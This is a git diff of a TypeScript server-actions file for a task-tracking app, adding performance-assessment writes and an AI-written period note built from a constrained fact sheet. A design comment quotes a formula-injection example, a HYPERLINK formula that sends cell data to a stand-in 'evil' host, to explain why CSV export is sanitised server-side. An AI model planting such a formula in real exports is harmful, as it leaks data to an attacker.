@@ -3,7 +3,15 @@
 import { requireRole, requireUser } from '@/lib/auth/current-user';
 import {
   activityEvents,
+  assessmentsFor,
   personBrief,
+  periodHistory,
+  saveEmployeeResponse,
+  setAssessmentState,
+  upsertAssessment,
+  type Assessment,
+  type AssessmentDraft,
+  type PeriodRow,
   completedInWindow,
   dailyTaskForms,
   taskLedgerDetail,
@@ -23,8 +31,10 @@ import {
 import {
   writeActivitySummary,
   writeNarrative,
+  writePeriodNote,
   type ActivitySummary,
   type Narrative,
+  type PeriodNote,
 } from '@/lib/ai/narrative';
 import { dayWord, phraseOf, KIND_LABEL, eventKind } from '@/lib/view/activity';
 import { toCsv } from '@/lib/domain/csv';
@@ -568,7 +578,7 @@ export async function taskLedgerDetailAction(taskId: string): Promise<LedgerDeta
 }
 
 /* ============================================================================
- * SUMMARISE THIS ACTIVITY \u2014 owner, 2026-09-24
+ * SUMMARISE THIS ACTIVITY — owner, 2026-09-24
  * ----------------------------------------------------------------------------
  * The button on the Activity history panel. The browser sends the ids of the
  * events currently in view; every word the model reads is fetched back out of
@@ -589,10 +599,10 @@ export async function activitySummaryAction(
   eventIds: readonly string[],
 ): Promise<ActivitySummaryPayload> {
   const { user, ownOnly } = await requireRoleAndUser();
-  /* \u26a0\ufe0f A MEMBER SUMMARISES THEMSELVES, whichever id arrived. */
+  /* ⚠️ A MEMBER SUMMARISES THEMSELVES, whichever id arrived. */
   const who = ownOnly ? user.id : personId;
 
-  /* \u26a0\ufe0f CAPPED BEFORE THE ROUND TRIP. 400 events is the read's own ceiling;
+  /* ⚠️ CAPPED BEFORE THE ROUND TRIP. 400 events is the read's own ceiling;
      the newest 120 is as much as the model can usefully describe, and it keeps
      a pasted list of ids from becoming an expensive request. */
   const ids = [...new Set(eventIds)].filter((id) => UUID_RE.test(id)).slice(0, 120);
@@ -625,8 +635,8 @@ const UUID_RE = /^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/
 /**
  * The events as lines the model may only rearrange.
  *
- * \u26a0\ufe0f IT STATES WHAT IS MISSING. A move with no recorded reason says so on
- * its own line, because a model given silence will fill it \u2014 and a plausible
+ * ⚠️ IT STATES WHAT IS MISSING. A move with no recorded reason says so on
+ * its own line, because a model given silence will fill it — and a plausible
  * invented reason on a page about a named colleague is the worst thing this
  * screen could print.
  */
@@ -648,7 +658,7 @@ function activityFactSheet(events: readonly Awaited<ReturnType<typeof activityEv
       .map((c) => `${c.field}: ${c.from ?? 'not set'} to ${c.to ?? 'not set'}`)
       .join('; ');
     return [
-      `${when(e.at)} PKT \u2014 ${e.actorName ?? 'Somebody'} ${p.verb} "${task}"`,
+      `${when(e.at)} PKT — ${e.actorName ?? 'Somebody'} ${p.verb} "${task}"`,
       e.projectName ? ` in ${e.projectName}` : '',
       diff ? ` (${diff})` : '',
       p.note ? ` [${p.note}]` : '',
@@ -671,20 +681,20 @@ function activityFactSheet(events: readonly Awaited<ReturnType<typeof activityEv
 }
 
 /* ============================================================================
- * EXPORTING THE ACTIVITY HISTORY \u2014 owner, 2026-09-24
+ * EXPORTING THE ACTIVITY HISTORY — owner, 2026-09-24
  * ----------------------------------------------------------------------------
  * *"Export also show a drop-up option of export in CSV and Excel and PDF ...
  * PDF in a proper template."*
  *
- * \u26a0\ufe0f ALL THREE ARE BUILT HERE, NOT IN THE BROWSER. The first version wrote
+ * ⚠️ ALL THREE ARE BUILT HERE, NOT IN THE BROWSER. The first version wrote
  * the CSV client-side, which is fast and wrong: a task titled
  * `=HYPERLINK("http://evil/"&A1,"brief")` is a live formula the moment the file
  * opens, and task titles are typed by people. `lib/domain/csv.ts` already
- * neutralises that and is not reimplemented \u2014 two copies of a security control
+ * neutralises that and is not reimplemented — two copies of a security control
  * is one copy that gets forgotten. Building all three in one place also means
  * the spreadsheet and the sheet cannot drift from each other.
  *
- * \u26a0\ufe0f AND THE ROWS ARE READ BACK FROM THE DATABASE, not posted up from the
+ * ⚠️ AND THE ROWS ARE READ BACK FROM THE DATABASE, not posted up from the
  * page. The browser sends the ids of what it had in view; every word in the
  * file is fetched under the caller's own RLS.
  * ========================================================================= */
@@ -867,7 +877,7 @@ function activityRow(e: Awaited<ReturnType<typeof activityEvents>>[number]) {
 /**
  * The spreadsheet.
  *
- * \u26a0\ufe0f TWO SHEETS, for the same reason the Reports export has two: a header
+ * ⚠️ TWO SHEETS, for the same reason the Reports export has two: a header
  * block sitting above the table breaks sorting, filtering and every formula
  * that assumes row 1 is the header. The context travels in "About".
  */
@@ -894,7 +904,7 @@ async function activityToXlsx(
   );
 
   const about: Cell[][] = [
-    [{ value: `Activity history \u2014 ${name}`, fontWeight: 'bold' }],
+    [{ value: `Activity history — ${name}`, fontWeight: 'bold' }],
     [{ value: request.periodLabel ?? '' }],
     [],
     [
@@ -909,7 +919,7 @@ async function activityToXlsx(
     [{ value: 'Filters applied', fontWeight: 'bold' }],
     ...(request.filters && request.filters.length > 0
       ? request.filters.map((f): Cell[] => [{ value: f }])
-      : [[{ value: 'None \u2014 this is the whole period.' }] as Cell[]]),
+      : [[{ value: 'None — this is the whole period.' }] as Cell[]]),
     [],
     [{ value: 'How to read this', fontWeight: 'bold' }],
     [
@@ -943,4 +953,199 @@ async function activityToXlsx(
   ]);
 
   return toBuffer();
+}
+
+/* ============================================================================
+ * PERFORMANCE HISTORY — the writes, and the note beside the chart
+ * ----------------------------------------------------------------------------
+ * Owner, 2026-09-24, from the reference: an assessment per period, an agreed
+ * follow-up, and a visibility rule the page states in words.
+ *
+ * ⚠️ THE SCOPE OVERRIDE IS REPEATED HERE, as it is on every action in this
+ * file. A server action is a public endpoint; the page hiding a control
+ * protects nothing on its own.
+ * ========================================================================= */
+
+export interface HistoryPayload {
+  readonly ok: boolean;
+  readonly error?: string;
+  readonly periods?: readonly PeriodRow[];
+  readonly assessments?: readonly Assessment[];
+}
+
+/** Re-read after a save, so the page never guesses what the database now holds. */
+export async function performanceHistoryAction(
+  personId: string,
+  by: 'week' | 'month',
+): Promise<HistoryPayload> {
+  const { user, ownOnly } = await requireRoleAndUser();
+  const who = ownOnly ? user.id : personId;
+  try {
+    const [periods, assessments] = await Promise.all([
+      periodHistory(user.id, who, by, isoDateIn()),
+      assessmentsFor(user.id, who),
+    ]);
+    return { ok: true, periods, assessments };
+  } catch (error) {
+    console.error('[performance] history read failed', error);
+    return { ok: false, error: 'That history could not be read.' };
+  }
+}
+
+export interface AssessmentPayload {
+  readonly ok: boolean;
+  readonly error?: string;
+  readonly assessments?: readonly Assessment[];
+}
+
+/**
+ * Save the manager's half of one period's assessment.
+ *
+ * ⚠️ A MEMBER MAY NOT CALL THIS AT ALL, and the check is not the `ownOnly`
+ * override used elsewhere: forcing the subject to themselves would let somebody
+ * write an assessment ABOUT THEMSELVES, which is the one thing this feature
+ * must never allow. It refuses instead. The table's trigger refuses it a second
+ * time, whatever reaches the database.
+ */
+export async function saveAssessmentAction(draft: AssessmentDraft): Promise<AssessmentPayload> {
+  const { user, ownOnly } = await requireRoleAndUser();
+  if (ownOnly) {
+    return { ok: false, error: 'Only a coordinator, admin or super admin writes an assessment.' };
+  }
+  if (draft.subjectId === user.id) {
+    return { ok: false, error: 'An assessment cannot be written about yourself.' };
+  }
+  try {
+    await upsertAssessment(user.id, {
+      ...draft,
+      /* Trimmed here rather than in the browser: the page is one of several
+         things that could call this. */
+      strengths: draft.strengths.trim().slice(0, 4000),
+      improvementAreas: draft.improvementAreas.trim().slice(0, 4000),
+      goal: draft.goal.trim().slice(0, 2000),
+      acceptance: draft.acceptance.map((a) => a.trim()).filter(Boolean).slice(0, 12),
+      baseline: draft.baseline.trim().slice(0, 500),
+      target: draft.target.trim().slice(0, 500),
+      support: draft.support.trim().slice(0, 2000),
+    });
+    return { ok: true, assessments: await assessmentsFor(user.id, draft.subjectId) };
+  } catch (error) {
+    console.error('[performance] assessment save failed', error);
+    return { ok: false, error: describeWriteFailure(error, 'That assessment could not be saved.') };
+  }
+}
+
+export async function setAssessmentStateAction(
+  id: string,
+  state: 'draft' | 'reviewed' | 'published',
+  subjectId: string,
+): Promise<AssessmentPayload> {
+  const { user, ownOnly } = await requireRoleAndUser();
+  if (ownOnly) {
+    return { ok: false, error: 'Only a coordinator, admin or super admin publishes an assessment.' };
+  }
+  try {
+    const moved = await setAssessmentState(user.id, id, state);
+    if (!moved) return { ok: false, error: 'That assessment could not be found.' };
+    return { ok: true, assessments: await assessmentsFor(user.id, subjectId) };
+  } catch (error) {
+    console.error('[performance] assessment state failed', error);
+    return { ok: false, error: describeWriteFailure(error, 'That assessment could not be moved.') };
+  }
+}
+
+/**
+ * The subject's reply to a published review.
+ *
+ * ⚠️ ANYBODY MAY CALL IT; THE DATABASE DECIDES. The policy admits only the
+ * subject to a row they are the subject of, and the trigger refuses every
+ * column but this one and refuses it entirely while the review is a draft.
+ */
+export async function respondToAssessmentAction(
+  id: string,
+  response: string,
+  subjectId: string,
+): Promise<AssessmentPayload> {
+  const { user } = await requireRoleAndUser();
+  try {
+    const saved = await saveEmployeeResponse(user.id, id, response.trim().slice(0, 4000));
+    if (!saved) return { ok: false, error: 'That review could not be found.' };
+    return { ok: true, assessments: await assessmentsFor(user.id, subjectId) };
+  } catch (error) {
+    console.error('[performance] assessment response failed', error);
+    return { ok: false, error: describeWriteFailure(error, 'Your response could not be saved.') };
+  }
+}
+
+/**
+ * ⚠️ THE DATABASE'S OWN SENTENCE, WHERE IT WROTE ONE. The guard trigger raises
+ * messages meant to be read ("A published review can be answered, not edited"),
+ * and replacing them with a generic refusal is the mistake recorded in
+ * `catch-blocks-name-a-guessed-cause`.
+ */
+function describeWriteFailure(error: unknown, fallback: string): string {
+  const message = error instanceof Error ? error.message : '';
+  if (/review|assessment|yourself/i.test(message)) return message;
+  return fallback;
+}
+
+/* ── "What changed and why" ──────────────────────────────────────────────── */
+
+export interface PeriodNotePayload {
+  readonly ok: boolean;
+  readonly error?: string;
+  readonly note?: PeriodNote;
+  readonly rows?: string;
+}
+
+export async function periodNoteAction(
+  personId: string,
+  by: 'week' | 'month',
+): Promise<PeriodNotePayload> {
+  const { user, ownOnly } = await requireRoleAndUser();
+  const who = ownOnly ? user.id : personId;
+  try {
+    const [periods, person] = await Promise.all([
+      periodHistory(user.id, who, by, isoDateIn()),
+      personBrief(user.id, who),
+    ]);
+    if (periods.length === 0) return { ok: false, error: 'There are no periods to describe.' };
+
+    const rows = periodFactSheet(person?.name ?? 'This person', periods);
+    return { ok: true, note: await writePeriodNote(rows), rows };
+  } catch (error) {
+    console.error('[performance] period note failed', error);
+    return {
+      ok: false,
+      error:
+        error instanceof Error && error.message.includes('CHATGPT_API_KEY')
+          ? 'The AI key is not configured, so the written note is unavailable. Every figure on this page is still read from the database.'
+          : 'The written note could not be produced. Every figure on this page is still read from the database.',
+    };
+  }
+}
+
+/** The rows the model may only rearrange, plus what they do NOT record. */
+function periodFactSheet(name: string, periods: readonly PeriodRow[]): string {
+  const lines = periods.map((p) => {
+    const onTime = p.judged > 0 ? `${p.onTime} of ${p.judged} on time` : 'no task in this period had a due date';
+    return `${p.bucket} (${p.startsOn} to ${p.endsOn}): completed ${p.completed}, reviewed by somebody else ${p.reviewed}, ${onTime}, overdue at the end of the period ${p.overdueAtCutoff}.`;
+  });
+
+  const everReviewed = periods.reduce((n, p) => n + p.reviewed, 0);
+
+  return [
+    `PERSON: ${name}`,
+    `PERIODS: ${periods.length}, oldest first.`,
+    '',
+    ...lines,
+    '',
+    'WHAT THESE FIGURES DO AND DO NOT MEAN:',
+    '- "Completed" counts tasks closed inside the period, by the date they were closed.',
+    '- "On time" can only judge a task that had a due date. Tasks with no date are excluded from that fraction rather than counted as late.',
+    '- "Overdue at the end of the period" is as at that period\'s last day, not today. It is a snapshot, so it can rise while completions also rise.',
+    `- "Reviewed" counts tasks that somebody OTHER than the person doing them closed or sent back. Across these periods that total is ${everReviewed}.`,
+    '- Hours worked are not recorded anywhere in this system, so nothing here says how long anything took.',
+    '- Nothing records WHY a figure moved. Do not state a cause.',
+  ].join('\n');
 }
